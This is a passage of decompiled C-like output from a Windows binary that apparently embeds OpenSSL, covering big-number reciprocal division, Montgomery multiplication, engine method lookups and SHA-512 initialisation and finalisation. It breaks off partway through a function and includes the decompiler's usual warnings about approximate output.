          if ( sub_4173C0((int)v7, 4 * v8) )
          {
            sub_441AF0((int *)*v5, (unsigned int *)*a2, v3, *v7);
            goto LABEL_19;
          }
        }
        else if ( sub_4173C0((int)v7, v11) )
        {
          sub_441A30((int *)*v5, (unsigned int *)*a2, v3, *v7);
          goto LABEL_19;
        }
      }
    }
  }
  v10 = 0;
LABEL_26:
  sub_420750(a3);
  return v10;
}
// 441C90: using guessed type unsigned int var_80[32];

//----- (00441E30) --------------------------------------------------------
int __cdecl sub_441E30(_DWORD *a1)
{
  int result; // eax

  sub_416880(a1);
  sub_416880(a1 + 5);
  result = 0;
  a1[10] = 0;
  a1[12] = 0;
  return result;
}

//----- (00441E60) --------------------------------------------------------
void __cdecl sub_441E60(void **Block)
{
  if ( Block )
  {
    sub_417060(Block);
    sub_417060(Block + 5);
    if ( ((_BYTE)Block[12] & 1) != 0 )
      sub_413490(Block);
  }
}

//----- (00441EA0) --------------------------------------------------------
int __cdecl sub_441EA0(_DWORD *a1, _DWORD *a2)
{
  int result; // eax

  result = (int)sub_4173E0(a1, a2);
  if ( result )
  {
    sub_417490(a1 + 5, 0);
    a1[10] = sub_416F90(a2);
    a1[11] = 0;
    return 1;
  }
  return result;
}

//----- (00441EF0) --------------------------------------------------------
int __cdecl sub_441EF0(_DWORD *a1, int *a2, int a3, int *a4)
{
  int v4; // ebx
  _DWORD *v5; // eax
  _DWORD *v6; // esi

  v4 = -1;
  sub_420700(a4);
  v5 = sub_420790(a4);
  v6 = v5;
  if ( v5 && sub_417640(v5, a3) && sub_4299A0(a1, 0, v6, a2, a4) )
    v4 = a3;
  sub_420750(a4);
  return v4;
}

//----- (00441F50) --------------------------------------------------------
int __cdecl sub_441F50(int *a1, _DWORD *a2, unsigned int **a3, int *a4, int *a5)
{
  int *v5; // edi
  unsigned int **v6; // esi
  unsigned int **v7; // ebp
  int *v8; // eax
  _DWORD *v9; // ebx
  int v11; // edi
  int v12; // edi
  int v13; // ecx
  unsigned int *v14; // eax
  int v15; // [esp+14h] [ebp-4h]
  int *v16; // [esp+1Ch] [ebp+4h]

  v5 = a5;
  v15 = 0;
  sub_420700(a5);
  v6 = (unsigned int **)sub_420790(a5);
  v7 = (unsigned int **)sub_420790(a5);
  v8 = a1;
  if ( !a1 )
    v8 = sub_420790(a5);
  v9 = a2;
  v16 = v8;
  if ( !a2 )
    v9 = sub_420790(a5);
  if ( !v6 || !v7 || !v16 || !v9 )
  {
LABEL_34:
    sub_420750(v5);
    return v15;
  }
  if ( sub_416960(a3, a4) >= 0 )
  {
    v11 = sub_416F90(a3);
    if ( 2 * a4[10] > v11 )
      v11 = 2 * a4[10];
    if ( v11 != a4[11] )
      a4[11] = sub_441EF0(a4 + 5, a4, v11, a5);
    if ( a4[11] != -1 )
    {
      if ( sub_437D40(v6, a3, a4[10]) )
      {
        if ( sub_421C20(v7, v6, (unsigned int **)a4 + 5, a5) )
        {
          if ( sub_437D40((unsigned int **)v16, v7, v11 - a4[10]) )
          {
            v16[3] = 0;
            if ( sub_421C20(v7, (unsigned int **)a4, (unsigned int **)v16, a5) )
            {
              if ( sub_421F50(v9, (int)a3, (int)v7) )
              {
                v12 = 0;
                v9[3] = 0;
                if ( sub_416960(v9, a4) < 0 )
                {
LABEL_28:
                  if ( sub_416DB0((int)v9) )
                    v14 = 0;
                  else
                    v14 = a3[3];
                  v9[3] = v14;
                  v15 = 1;
                  v16[3] = a4[3] ^ (unsigned int)a3[3];
                }
                else
                {
                  while ( 1 )
                  {
                    v13 = v12++;
                    if ( v13 > 2 )
                      break;
                    if ( !sub_421F50(v9, (int)v9, (int)a4) || !sub_437FD0(v16, 1) )
                      goto LABEL_33;
                    if ( sub_416960(v9, a4) < 0 )
                      goto LABEL_28;
                  }
                  sub_408310(3, 130, 101, (int)"crypto\\bn\\bn_recp.c", 154);
                }
              }
            }
          }
        }
      }
    }
LABEL_33:
    v5 = a5;
    goto LABEL_34;
  }
  sub_417490(v16, 0);
  if ( sub_4173E0(v9, a3) )
  {
    sub_420750(a5);
    return 1;
  }
  else
  {
    sub_420750(a5);
    return 0;
  }
}

//----- (004421B0) --------------------------------------------------------
int __cdecl sub_4421B0(_DWORD *a1, int *a2, unsigned int **a3, int *a4, int *a5)
{
  int v5; // ebx
  unsigned int **v6; // edi
  int v7; // eax

  v5 = 0;
  sub_420700(a5);
  v6 = (unsigned int **)sub_420790(a5);
  if ( v6 )
  {
    if ( !a3 )
    {
      v6 = (unsigned int **)a2;
LABEL_9:
      v5 = sub_441F50(0, a1, v6, a4, a5);
      goto LABEL_10;
    }
    if ( a2 == (int *)a3 )
      v7 = sub_441C90((int *)v6, a2, a5);
    else
      v7 = sub_421C20(v6, (unsigned int **)a2, a3, a5);
    if ( v7 )
      goto LABEL_9;
  }
LABEL_10:
  sub_420750(a5);
  return v5;
}

//----- (00442240) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __cdecl sub_442240(__m64 a1, int a2, __int64 a3, int a4)
{
  int result; // eax
  __int16 v5; // sp
  _BYTE *v6; // ebp
  unsigned int v7; // ebp
  unsigned int v8; // esi
  int v9; // ebx
  __m64 v10; // mm7
  unsigned int *v11; // esi
  unsigned int *v12; // edi
  __m64 v13; // mm4
  __m64 v14; // mm2
  __m64 v15; // mm5
  __m64 v16; // mm3
  __m64 v17; // mm1
  __m64 v18; // mm0
  __m64 v19; // mm2
  __m64 v20; // mm3
  int v21; // ecx
  __m64 v22; // mm2
  __m64 v23; // mm3
  __m64 v24; // mm3
  __m64 v25; // mm2
  __m64 v26; // mm3
  int v27; // edx
  __m64 v28; // mm4
  __m64 v29; // mm2
  __m64 v30; // mm5
  __m64 v31; // mm1
  __m64 v32; // mm0
  __m64 v33; // mm3
  __m64 v34; // mm2
  int v35; // ecx
  int v36; // ebx
  __m64 v37; // mm2
  __m64 v38; // mm3
  __m64 v39; // mm6
  __m64 v40; // mm3
  __m64 v41; // mm2
  __m64 v42; // mm3
  unsigned int *v43; // esi
  int v44; // ecx
  unsigned int v45; // edi
  unsigned int v46; // eax
  unsigned int v47; // edx
  int v48; // kr28_4
  unsigned __int64 v49; // rax
  unsigned int *v50; // esi
  unsigned int v51; // edi
  unsigned __int64 v52; // rax
  unsigned int v53; // eax
  int v54; // edx
  int i; // ecx
  unsigned int v56; // ebp
  unsigned __int64 v57; // rax
  unsigned int v58; // kr00_4
  int v59; // ecx
  unsigned int v60; // kr04_4
  unsigned int v61; // eax
  unsigned int v62; // edx
  int v63; // edx
  unsigned int v64; // kr38_4
  unsigned int v65; // eax
  unsigned __int64 v66; // rax
  int v67; // ebp
  unsigned __int64 v68; // rax
  unsigned int v69; // kr08_4
  unsigned int v70; // kr0C_4
  int v71; // ebp
  unsigned __int64 v72; // rax
  unsigned __int64 v73; // kr50_8
  unsigned __int64 v74; // kr58_8
  unsigned int *v75; // ecx
  bool v76; // zf
  unsigned int v77; // edi
  unsigned int *v78; // esi
  unsigned __int64 v79; // rax
  int v80; // ebx
  int v81; // ecx
  unsigned int v82; // ebp
  unsigned __int64 v83; // rax
  int v84; // ebp
  bool v85; // cc
  unsigned __int64 v86; // rax
  unsigned int *v87; // esi
  unsigned int v88; // edi
  unsigned int v89; // ebp
  unsigned int v90; // edx
  unsigned int v91; // eax
  int j; // ecx
  unsigned int v93; // ebp
  unsigned __int64 v94; // rax
  unsigned int v95; // kr10_4
  unsigned int v96; // ebp
  unsigned __int64 v97; // rax
  unsigned int v98; // kr14_4
  unsigned int v99; // kr18_4
  unsigned int v100; // ebp
  unsigned __int64 v101; // rax
  unsigned __int64 v102; // kr80_8
  unsigned int *v103; // ecx
  unsigned int *v104; // esi
  unsigned __int64 v105; // kr88_8
  unsigned int v106; // edi
  unsigned int *v107; // ecx
  unsigned __int64 v108; // rax
  unsigned int v109; // ebp
  int v110; // ecx
  char v111; // bl
  int v112; // ebx
  int v113; // ebp
  unsigned int v114; // kr24_4
  unsigned __int64 v115; // kr90_8
  int v116; // ebp
  unsigned int *v117; // edi
  unsigned int v118; // eax
  int v119; // ecx
  bool v120; // cf
  int v121; // edx
  unsigned int v122; // ett
  int v123; // [esp-Ch] [ebp-1010h] BYREF
  _BYTE v124[12]; // [esp+FC8h] [ebp-3Ch] BYREF
  int v125; // [esp+FE8h] [ebp-1Ch] BYREF
  int v126; // [esp+FF4h] [ebp-10h] BYREF
  unsigned int *v127; // [esp+FF8h] [ebp-Ch]
  unsigned int *v128; // [esp+FFCh] [ebp-8h]
  unsigned int *v129; // [esp+1000h] [ebp-4h]
  unsigned int *retaddr; // [esp+1004h] [ebp+0h]

  result = 0;
  if ( a2 >= 4 )
  {
    v6 = &v124[-(((unsigned __int16)&v124[-4 * a2 - 8] - (v5 + 24)) & 0x7FF) - 8 + -4 * a2];
    v7 = (unsigned int)&v6[-(((unsigned __int16)v6 ^ (unsigned __int16)(v5 + 24)) & 0x800 ^ 0x800)] & 0xFFFFFFC0;
    if ( (unsigned int)&v126 > v7 )
    {
      while ( (unsigned int)&v123 > v7 )
        ;
    }
    v8 = *(_DWORD *)a1.m64_i32[1];
    v127 = v128;
    v128 = v129;
    v129 = retaddr;
    retaddr = (unsigned int *)a1.m64_i32[0];
    a1.m64_u64 = __PAIR64__(&v125, v8);
    v9 = a2 - 1;
    if ( _bittest(&dword_73C6D0, 0x1Au) )
    {
      v10 = _mm_cvtsi32_si64(0xFFFFFFFF);
      v11 = v128;
      v12 = v129;
      v13 = _mm_cvtsi32_si64(*v129);
      v14 = _mm_mul_su64(_mm_cvtsi32_si64(*v128), v13);
      v15 = _mm_mul_su64(v14, a1);
      v16 = _mm_add_si64(_mm_mul_su64(_mm_cvtsi32_si64(*retaddr), v15), _m_pand(v14, v10));
      v17 = _mm_cvtsi32_si64(retaddr[1]);
      v18 = _mm_cvtsi32_si64(v128[1]);
      v19 = _m_psrlqi(v14, 0x20u);
      v20 = _m_psrlqi(v16, 0x20u);
      v21 = 1;
      do
      {
        v22 = _mm_add_si64(v19, _mm_mul_su64(v18, v13));
        v23 = _mm_add_si64(v20, _mm_mul_su64(v17, v15));
        v17 = _mm_cvtsi32_si64(retaddr[v21 + 1]);
        v24 = _mm_add_si64(v23, _m_pand(v22, v10));
        v18 = _mm_cvtsi32_si64(v11[v21 + 1]);
        v19 = _m_psrlqi(v22, 0x20u);
        *(&a2 + v21) = _mm_cvtsi64_si32(v24);
        v20 = _m_psrlqi(v24, 0x20u);
        ++v21;
      }
      while ( v21 < v9 );
      v25 = _mm_add_si64(v19, _mm_mul_su64(v18, v13));
      v26 = _mm_add_si64(_mm_add_si64(v20, _mm_mul_su64(v17, v15)), _m_pand(v25, v10));
      *(&a2 + v21) = _mm_cvtsi64_si32(v26);
      *(__int64 *)((char *)&a3 + 4 * v9) = (__int64)_mm_add_si64(_m_psrlqi(v26, 0x20u), _m_psrlqi(v25, 0x20u));
      v27 = 1;
      do
      {
        v28 = _mm_cvtsi32_si64(v12[v27]);
        v29 = _mm_add_si64(_mm_mul_su64(_mm_cvtsi32_si64(*v11), v28), _mm_cvtsi32_si64(a3));
        v30 = _mm_mul_su64(v29, a1);
        v31 = _mm_cvtsi32_si64(retaddr[1]);
        v32 = _mm_cvtsi32_si64(v11[1]);
        v33 = _m_psrlqi(_mm_add_si64(_mm_mul_su64(_mm_cvtsi32_si64(*retaddr), v30), _m_pand(v29, v10)), 0x20u);
        v34 = _mm_add_si64(_m_psrlqi(v29, 0x20u), _mm_cvtsi32_si64(HIDWORD(a3)));
        v35 = 1;
        v36 = v9 - 1;
        do
        {
          v37 = _mm_add_si64(v34, _mm_mul_su64(v32, v28));
          v38 = _mm_add_si64(v33, _mm_mul_su64(v31, v30));
          v39 = _mm_cvtsi32_si64(*((_DWORD *)&a3 + v35 + 1));
          v31 = _mm_cvtsi32_si64(retaddr[v35 + 1]);
          v40 = _mm_add_si64(v38, _m_pand(v37, v10));
          v32 = _mm_cvtsi32_si64(v11[v35 + 1]);
          *(&a2 + v35) = _mm_cvtsi64_si32(v40);
          v33 = _m_psrlqi(v40, 0x20u);
          v34 = _mm_add_si64(_m_psrlqi(v37, 0x20u), v39);
          --v36;
          ++v35;
        }
        while ( v36 );
        v9 = v35;
        v41 = _mm_add_si64(v34, _mm_mul_su64(v32, v28));
        v42 = _mm_add_si64(_mm_add_si64(v33, _mm_mul_su64(v31, v30)), _m_pand(v41, v10));
        *(&a2 + v35) = _mm_cvtsi64_si32(v42);
        *(__int64 *)((char *)&a3 + 4 * v35) = (__int64)_mm_add_si64(
                                                         _mm_add_si64(_m_psrlqi(v42, 0x20u), _m_psrlqi(v41, 0x20u)),
                                                         _mm_cvtsi32_si64(*((_DWORD *)&a3 + v35 + 1)));
        ++v27;
      }
      while ( v27 <= v35 );
      _m_empty();
    }
    else
    {
      v43 = v128;
      v44 = 0;
      v45 = *v129;
      if ( ((char *)v128 - (char *)v129) | a2 & 1 )
      {
        a2 = (int)&v129[v9 + 1];
        v46 = *v128;
        v47 = 0;
        do
        {
          ++v44;
          v48 = v45 * v46 + v47;
          v47 = (v45 * (unsigned __int64)v46 + v47) >> 32;
          v46 = v43[v44];
          *(&a2 + v44) = v48;
        }
        while ( v44 < v9 );
        v50 = retaddr;
        v49 = v47 + v45 * (unsigned __int64)v46;
        v51 = a3 * a1.m64_i32[0];
        *((_DWORD *)&a3 + v9) = v49;
        *((_DWORD *)&a3 + v9 + 1) = HIDWORD(v49);
        *(&a4 + v9) = 0;
        v52 = v51 * (unsigned __int64)*retaddr;
        v120 = __CFADD__((_DWORD)a3, (_DWORD)v52);
        v53 = retaddr[1];
        v54 = v120 + HIDWORD(v52);
        for ( i = 1; ; i = 1 )
        {
          do
          {
            v67 = v54;
            v68 = v51 * (unsigned __int64)v53;
            v69 = *((_DWORD *)&a3 + i++);
            v70 = v68;
            v53 = v50[i];
            v54 = (__PAIR64__(HIDWORD(v68), v69) + (unsigned int)v67 + v70) >> 32;
            a1.m64_i32[i + 1] = v69 + v67 + v70;
          }
          while ( i < v9 );
          v71 = v54;
          v72 = v51 * (unsigned __int64)v53;
          HIDWORD(v72) = (*((unsigned int *)&a3 + v9) + __PAIR64__(HIDWORD(v72), v71)) >> 32;
          v73 = v72 + (unsigned int)(*((_DWORD *)&a3 + v9) + v71);
          *(&a2 + v9) = v73;
          v74 = __PAIR64__(*(&a4 + v9), *((_DWORD *)&a3 + v9 + 1)) + HIDWORD(v73);
          v75 = v129 + 1;
          *((_DWORD *)&a3 + v9) = v74;
          v76 = v75 == (unsigned int *)a2;
          *((_DWORD *)&a3 + v9 + 1) = HIDWORD(v74);
          if ( v76 )
            break;
          v77 = *v75;
          v78 = v128;
          v129 = v75;
          v59 = 0;
          v62 = 0;
          v61 = *v128;
          do
          {
            v56 = v62;
            v57 = v77 * (unsigned __int64)v61;
            v58 = *((_DWORD *)&a3 + v59++);
            v60 = v57;
            v61 = v78[v59];
            v62 = (__PAIR64__(HIDWORD(v57), v58) + v56 + v60) >> 32;
            *(&a2 + v59) = v58 + v56 + v60;
          }
          while ( v59 < v9 );
          v50 = retaddr;
          v64 = *((_DWORD *)&a3 + v9) + v77 * v61 + v62;
          v63 = (*((unsigned int *)&a3 + v9) + v77 * (unsigned __int64)v61 + __PAIR64__(*((_DWORD *)&a3 + v9 + 1), v62)) >> 32;
          v51 = a3 * a1.m64_i32[0];
          v120 = __CFADD__(*((_DWORD *)&a3 + v9 + 1), v63);
          *((_DWORD *)&a3 + v9) = v64;
          v65 = *retaddr;
          *((_DWORD *)&a3 + v9 + 1) = v63;
          *(&a4 + v9) = v120;
          v66 = v51 * (unsigned __int64)v65;
          v120 = __CFADD__((_DWORD)a3, (_DWORD)v66);
          v53 = retaddr[1];
          v54 = v120 + HIDWORD(v66);
        }
      }
      else
      {
        v126 = a2 - 1;
        v129 = 0;
        LODWORD(a3) = v45 * v45;
        HIDWORD(v79) = (unsigned int)((v45 * (unsigned __int64)v45) >> 32) >> 1;
        v80 = ((v45 * (unsigned __int64)v45) >> 32) & 1;
        v81 = 1;
        do
        {
          v82 = HIDWORD(v79);
          v83 = v45 * (unsigned __int64)v43[v81++];
          v79 = v82 + v83;
          v84 = v80 + 2 * v79;
          v85 = v81 < v126;
          v80 = (unsigned int)v79 >> 31;
          *(&a2 + v81) = v84;
        }
        while ( v85 );
        v86 = HIDWORD(v79) + v45 * (unsigned __int64)v43[v81];
        v87 = retaddr;
        v88 = a3 * a1.m64_i32[0];
        *((_DWORD *)&a3 + v81) = v80 + 2 * v86;
        v89 = ((unsigned int)v86 >> 31) + 2 * HIDWORD(v86);
        LODWORD(v86) = *retaddr;
        *((_DWORD *)&a3 + v81 + 1) = v89;
        *(&a4 + v81) = HIDWORD(v86) >> 31;
        v9 = v81;
        v90 = __CFADD__((_DWORD)a3, v88 * v86) + ((v88 * (unsigned __int64)(unsigned int)v86) >> 32);
        v91 = retaddr[1];
        for ( j = 1; ; j = 1 )
        {
          do
          {
            v93 = v90;
            v94 = v88 * (unsigned __int64)v91;
            v95 = v94;
            LODWORD(v94) = v87[j + 1];
            HIDWORD(v94) = (*((unsigned int *)&a3 + j) + __PAIR64__(HIDWORD(v94), v93) + v95) >> 32;
            *(&a2 + j) = *((_DWORD *)&a3 + j) + v93 + v95;
            v96 = HIDWORD(v94);
            v97 = v88 * (unsigned __int64)(unsigned int)v94;
            v98 = *((_DWORD *)&a3 + j + 1);
            j += 2;
            v99 = v97;
            v91 = v87[j];
            v90 = (__PAIR64__(HIDWORD(v97), v98) + v96 + v99) >> 32;
            a1.m64_i32[j + 1] = v98 + v96 + v99;
          }
          while ( j < v9 );
          v100 = v90;
          v101 = v88 * (unsigned __int64)v91;
          HIDWORD(v101) = (*((unsigned int *)&a3 + v9) + __PAIR64__(HIDWORD(v101), v100)) >> 32;
          v102 = v101 + *((_DWORD *)&a3 + v9) + v100;
          *(&a2 + v9) = v102;
          v103 = v129;
          v104 = v128;
          v105 = __PAIR64__(*(&a4 + v9), *((_DWORD *)&a3 + v9 + 1)) + HIDWORD(v102);
          *((_DWORD *)&a3 + v9) = v105;
          *((_DWORD *)&a3 + v9 + 1) = HIDWORD(v105);
          if ( v103 == (unsigned int *)v9 )
            break;
          v106 = v104[(_DWORD)v103 + 1];
          v107 = (unsigned int *)((char *)v103 + 1);
          v129 = v107;
          v108 = *((unsigned int *)&a3 + (_DWORD)v107) + v106 * (unsigned __int64)v106;
          *((_DWORD *)&a3 + (_DWORD)v107) = v108;
          v109 = 0;
          v76 = v107 == (unsigned int *)v9;
          v110 = (int)v107 + 1;
          if ( !v76 )
          {
            v111 = BYTE4(v108);
            HIDWORD(v108) >>= 1;
            v112 = v111 & 1;
            do
            {
              v113 = 2 * (HIDWORD(v108) + v106 * v104[v110]);
              v108 = v106 * (unsigned __int64)v104[v110] + HIDWORD(v108);
              v114 = *((_DWORD *)&a3 + v110++);
              v115 = (unsigned int)v112 + __PAIR64__((unsigned int)v108 >> 31, v114) + (unsigned int)v113;
              v85 = v110 <= v126;
              *(&a2 + v110) = v115;
              v112 = HIDWORD(v115);
            }
            while ( v85 );
            v109 = (HIDWORD(v115) + __PAIR64__(HIDWORD(v108) >> 31, 2 * HIDWORD(v108))) >> 32;
            HIDWORD(v108) = HIDWORD(v115) + 2 * HIDWORD(v108);
          }
          v87 = retaddr;
          v88 = a3 * a1.m64_i32[0];
          LODWORD(v108) = *retaddr;
          v116 = (__PAIR64__(v109, *((_DWORD *)&a3 + v110)) + HIDWORD(v108)) >> 32;
          *((_DWORD *)&a3 + v110) += HIDWORD(v108);
          *((_DWORD *)&a3 + v110 + 1) = v116;
          v9 = v110 - 1;
          v90 = __CFADD__((_DWORD)a3, v88 * v108) + ((v88 * (unsigned __int64)(unsigned int)v108) >> 32);
          v91 = retaddr[1];
        }
      }
    }
    v117 = v127;
    v118 = a3;
    v119 = v9;
    v121 = 0;
    v120 = 0;
    do
    {
      v122 = v120 + retaddr[v121];
      v120 = v118 < v122;
      v117[v121] = v118 - v122;
      v85 = v119-- < 1;
      v118 = *((_DWORD *)&a3 + ++v121);
    }
    while ( !v85 );
    do
    {
      v117[v9] = *(_DWORD *)((~(v118 - v120) & (unsigned int)v117 | (v118 - v120) & (unsigned int)&a3) + 4 * v9);
      *((_DWORD *)&a3 + v9) = v119;
      v85 = v9-- < 1;
    }
    while ( !v85 );
    return 1;
  }
  return result;
}
// 44280E: positive sp value C has been found
// 442257: variable 'v5' is possibly undefined
// 73C6D0: using guessed type int dword_73C6D0;

//----- (00442860) --------------------------------------------------------
int sub_442860()
{
  return sub_42AE00(&stru_5391A8);
}

//----- (00442870) --------------------------------------------------------
int __cdecl sub_442870(int *a1)
{
  int *v1; // esi
  int (__cdecl *v2)(int *, _DWORD, int **, _DWORD); // eax
  int v3; // eax

  v1 = a1;
  v2 = (int (__cdecl *)(int *, _DWORD, int **, _DWORD))a1[10];
  if ( v2 && (v3 = v2(a1, 0, &a1, 0), v3 > 0) )
    return sub_42AC30((int *)&stru_5391A8, (int)sub_442860, v1, a1, v3, 1);
  else
    return 1;
}

//----- (004428C0) --------------------------------------------------------
_DWORD *__cdecl sub_4428C0(int a1)
{
  return sub_42AE50((int *)&stru_5391A8, a1);
}

//----- (004428E0) --------------------------------------------------------
void __cdecl sub_4428E0(int a1)
{
  int v1; // edi
  int (__cdecl *v2)(int, _DWORD, int *, _DWORD); // eax
  int v3; // ebx
  int i; // esi
  void *Block; // [esp+4h] [ebp-4h] BYREF

  v1 = a1;
  v2 = *(int (__cdecl **)(int, _DWORD, int *, _DWORD))(a1 + 40);
  if ( v2 )
  {
    v3 = v2(a1, 0, &a1, 0);
    for ( i = 0; i < v3; ++i )
    {
      if ( (*(int (__cdecl **)(int, void **, _DWORD, _DWORD))(v1 + 40))(v1, &Block, 0, *(_DWORD *)(a1 + 4 * i)) )
        sub_430C20((void **)Block);
    }
  }
}

//----- (00442950) --------------------------------------------------------
int __cdecl sub_442950(int a1, int *a2, int a3, int a4)
{
  int result; // eax
  int v5; // ebx
  int v6; // esi
  int v7; // [esp+0h] [ebp-4h] BYREF

  result = a4;
  if ( !*(_DWORD *)(a4 + 4) )
  {
    v5 = 0;
    result = sub_426A30((int)a2);
    if ( result > 0 )
    {
      while ( 1 )
      {
        v6 = sub_426A40(a2, v5);
        (*(void (__cdecl **)(int, int *, _DWORD, int))(v6 + 40))(v6, &v7, 0, a1);
        if ( strlen(*(const char **)(v7 + 12)) == *(_DWORD *)(a4 + 12)
          && !_strnicmp(*(const char **)(v7 + 12), *(const char **)(a4 + 8), *(_DWORD *)(a4 + 12)) )
        {
          break;
        }
        ++v5;
        result = sub_426A30((int)a2);
        if ( v5 >= result )
          return result;
      }
      result = v7;
      *(_DWORD *)a4 = v6;
      *(_DWORD *)(a4 + 4) = result;
    }
  }
  return result;
}

//----- (00442A00) --------------------------------------------------------
int __cdecl sub_442A00(int *a1, int a2, int a3)
{
  int v4; // eax
  int v5; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+4h] [ebp-Ch]
  int v7; // [esp+8h] [ebp-8h]
  int v8; // [esp+Ch] [ebp-4h]

  v5 = 0;
  v6 = 0;
  v7 = a2;
  v8 = a3;
  if ( (sub_414700(&dword_53901C, (void (*)(void))sub_42A220) ? dword_539020 : 0) != 0 )
  {
    sub_414690(dword_73C6C0);
    sub_42AF80(&stru_5391A8.DebugInfo->Type, (int)sub_442950, (int)&v5);
    v4 = v5;
    if ( v5 )
    {
      ++*(_DWORD *)(v5 + 80);
      v4 = v5;
    }
    *a1 = v4;
    sub_4146B0(dword_73C6C0);
    return v6;
  }
  else
  {
    sub_408310(38, 197, 65, (int)"crypto\\engine\\tb_asnmth.c", 193);
    return 0;
  }
}
// 539020: using guessed type int dword_539020;

//----- (00442AC0) --------------------------------------------------------
int __cdecl sub_442AC0(int a1, int a2)
{
  int (__cdecl *v2)(int, int *, _DWORD, int); // eax

  v2 = *(int (__cdecl **)(int, int *, _DWORD, int))(a1 + 40);
  if ( v2 && v2(a1, &a1, 0, a2) )
    return a1;
  sub_408310(38, 193, 101, (int)"crypto\\engine\\tb_asnmth.c", 88);
  return 0;
}

//----- (00442B10) --------------------------------------------------------
int sub_442B10()
{
  return sub_42AE00((LPCRITICAL_SECTION)&stru_5391A8.LockCount);
}

//----- (00442B20) --------------------------------------------------------
int __cdecl sub_442B20(int *a1)
{
  int *v1; // esi
  int (__cdecl *v2)(int *, _DWORD, int **, _DWORD); // eax
  int v3; // eax

  v1 = a1;
  v2 = (int (__cdecl *)(int *, _DWORD, int **, _DWORD))a1[9];
  if ( v2 && (v3 = v2(a1, 0, &a1, 0), v3 > 0) )
    return sub_42AC30(&stru_5391A8.LockCount, (int)sub_442B10, v1, a1, v3, 0);
  else
    return 1;
}

//----- (00442B70) --------------------------------------------------------
int __cdecl sub_442B70(int *a1)
{
  int *v1; // esi
  int (__cdecl *v2)(int *, _DWORD, int **, _DWORD); // eax
  int v3; // eax

  v1 = a1;
  v2 = (int (__cdecl *)(int *, _DWORD, int **, _DWORD))a1[9];
  if ( v2 && (v3 = v2(a1, 0, &a1, 0), v3 > 0) )
    return sub_42AC30(&stru_5391A8.LockCount, (int)sub_442B10, v1, a1, v3, 1);
  else
    return 1;
}

//----- (00442BC0) --------------------------------------------------------
_DWORD *__cdecl sub_442BC0(int a1)
{
  return sub_42AE50(&stru_5391A8.LockCount, a1);
}

//----- (00442BE0) --------------------------------------------------------
void __cdecl sub_442BE0(int a1)
{
  int v1; // edi
  int (__cdecl *v2)(int, _DWORD, int *, _DWORD); // eax
  int v3; // ebx
  int i; // esi
  void *Block; // [esp+4h] [ebp-4h] BYREF

  v1 = a1;
  v2 = *(int (__cdecl **)(int, _DWORD, int *, _DWORD))(a1 + 36);
  if ( v2 )
  {
    v3 = v2(a1, 0, &a1, 0);
    for ( i = 0; i < v3; ++i )
    {
      if ( (*(int (__cdecl **)(int, void **, _DWORD, _DWORD))(v1 + 36))(v1, &Block, 0, *(_DWORD *)(a1 + 4 * i)) )
        sub_4439E0(Block);
    }
  }
}

//----- (00442C50) --------------------------------------------------------
int __cdecl sub_442C50(int a1, int a2)
{
  int (__cdecl *v2)(int, int *, _DWORD, int); // eax

  v2 = *(int (__cdecl **)(int, int *, _DWORD, int))(a1 + 36);
  if ( v2 && v2(a1, &a1, 0, a2) )
    return a1;
  sub_408310(38, 192, 101, (int)"crypto\\engine\\tb_pkmeth.c", 76);
  return 0;
}

//----- (00442D40) --------------------------------------------------------
int __cdecl sub_442D40(_DWORD *a1)
{
  *a1 = -205731576;
  a1[1] = 1779033703;
  a1[2] = -2067093701;
  a1[3] = -1150833019;
  a1[4] = -23791573;
  a1[5] = 1013904242;
  a1[6] = 1595750129;
  a1[7] = -1521486534;
  a1[8] = -1377402159;
  a1[9] = 1359893119;
  a1[10] = 725511199;
  a1[11] = -1694144372;
  a1[12] = -79577749;
  a1[13] = 528734635;
  a1[14] = 327033209;
  a1[15] = 1541459225;
  a1[16] = 0;
  a1[17] = 0;
  a1[18] = 0;
  a1[19] = 0;
  a1[52] = 0;
  a1[53] = 64;
  return 1;
}

//----- (00442DE0) --------------------------------------------------------
int __cdecl sub_442DE0(_BYTE *a1, int *a2)
{
  int v2; // ebx
  int *v3; // edi
  unsigned int v4; // ebx
  _BYTE *v5; // eax
  int v7; // ecx
  int *v8; // esi
  int v9; // edi
  int v10; // ecx
  int v11; // edx
  _BYTE *v12; // eax
  int v13; // edx
  int v14; // ecx
  int v15; // edx
  int v16; // ecx
  int v17; // edx
  int v18; // ecx
  int v19; // ecx
  int v20; // edx
  int v21; // edx
  int v22; // ecx
  int v23; // edx
  int v24; // ecx
  int v25; // edx
  int v26; // ecx
  int v27; // edx
  int v28; // ecx
  int v29; // ecx
  int v30; // esi

  v2 = a2[52];
  v3 = a2 + 20;
  *((_BYTE *)a2 + v2 + 80) = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x70 )
  {
    memset((char *)v3 + v4, 0, 128 - v4);
    v4 = 0;
    sub_462CC0();
  }
  memset((char *)v3 + v4, 0, 112 - v4);
  *((_BYTE *)a2 + 207) = *((_BYTE *)a2 + 64);
  *((_BYTE *)a2 + 206) = BYTE1(*((_QWORD *)a2 + 8));
  *((_BYTE *)a2 + 205) = BYTE2(a2[16]);
  *((_BYTE *)a2 + 204) = HIBYTE(a2[16]);
  *((_BYTE *)a2 + 203) = a2[17];
  *((_BYTE *)a2 + 202) = BYTE1(a2[17]);
  *((_BYTE *)a2 + 201) = *((_BYTE *)a2 + 70);
  *((_BYTE *)a2 + 200) = *((_BYTE *)a2 + 71);
  *((_BYTE *)a2 + 199) = *((_BYTE *)a2 + 72);
  *((_BYTE *)a2 + 198) = BYTE1(*((_QWORD *)a2 + 9));
  *((_BYTE *)a2 + 197) = BYTE2(a2[18]);
  *((_BYTE *)a2 + 196) = HIBYTE(a2[18]);
  *((_BYTE *)a2 + 195) = a2[19];
  *((_BYTE *)a2 + 194) = BYTE1(a2[19]);
  *((_BYTE *)a2 + 193) = *((_BYTE *)a2 + 78);
  *((_BYTE *)a2 + 192) = *((_BYTE *)a2 + 79);
  sub_462CC0();
  v5 = a1;
  if ( !a1 )
    return 0;
  v7 = a2[53];
  if ( v7 == 48 )
  {
    v19 = a2[1];
    v20 = *a2;
    *a1 = HIBYTE(v19);
    a1[1] = BYTE2(v19);
    a1[2] = BYTE1(v19);
    a1[3] = v19;
    a1[4] = HIBYTE(v20);
    a1[5] = BYTE2(v20);
    a1[6] = BYTE1(v20);
    a1[7] = v20;
    v21 = a2[2];
    v22 = a2[3];
    a1[8] = HIBYTE(v22);
    a1[9] = BYTE2(v22);
    a1[10] = BYTE1(v22);
    a1[11] = v22;
    a1[12] = HIBYTE(v21);
    a1[13] = BYTE2(v21);
